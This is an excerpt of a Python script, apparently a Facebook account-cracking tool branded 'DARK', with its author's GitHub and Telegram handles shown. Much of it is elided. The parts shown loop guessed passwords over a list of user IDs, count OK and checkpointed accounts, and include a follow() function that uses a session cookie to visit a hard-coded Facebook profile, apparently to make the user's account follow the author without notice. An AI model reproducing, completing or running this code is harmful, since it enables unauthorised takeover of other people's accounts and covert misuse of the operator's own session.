...
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:MD SHIMUL
\x1b[1;36m{+} \x1b[1;92mGITHUB NAME       \x1b[1;97m: \x1b[1;94m: MRSH4MUL
...
\x1b[1;36m{+} \x1b[1;93mTELEGRAM \x1b[1;97m: DARKCYBER420
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mᑭᖇEꇙꇙ EᑎTEᖇ TO ᗷᗩᑕK DARK ᗰEᑎᑌ ")
	    killer()
...
class __xxx__:
    ...
    def killerx(self,id):
        #os.system("clear")
        #print(logo)
        self.cnt = input(' \033[1;92m𝐅𝐈𝐋E 𝐍𝐀𝐌𝐄 : ')
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[DARK] \x1b[1;94m{loop}|\x1b[1;95m{len(self.id)} \x1b[1;92mOK/\x1b[1;91mCP \x1b[1;92m{len(ok)}\x1b[1;96m/\x1b[1;91m{len(cp)}")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100082346206254', cookies={'cookie': coki}).text, 'html.parser')
